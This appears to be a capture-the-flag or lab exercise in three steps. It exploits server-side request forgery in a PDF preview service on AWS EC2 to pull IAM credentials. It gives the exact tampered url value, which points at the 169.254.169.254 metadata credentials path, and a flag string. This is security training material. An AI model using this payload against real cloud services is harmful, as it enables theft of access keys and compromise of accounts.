metadata.title: SSRF to AWS Metadata - EC2 IAM Keys Theft

steps.name: Mission Brief & Cloud Scope
steps.content:
### 🎯 Mission Objective
Investigate a PDF preview microservice hosted on AWS EC2 to uncover Server-Side Request Forgery (SSRF) vulnerability and extract cloud IAM metadata keys (`169.254.169.254`).

### 📜 Target Scope
`https://cloud-preview.airbnb-target.com`

steps.name: Intercepting Preview Webhook
steps.content:
### 📡 Burp Intercept
Intercept the POST request sent to `/api/v2/fetch-preview` containing `url=https://public-doc.com/sample.pdf`.

steps.name: SSRF to AWS Metadata (169.254.169.254)
steps.content:
### 🔄 Repeater Exploitation
Modify `url` parameter to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role` to exfiltrate secret AWS AccessKeyId and SecretAccessKey!

Flag: `FLAG{SSRF_AWS_METADATA_IAM_KEYS_THEFT_2026}`
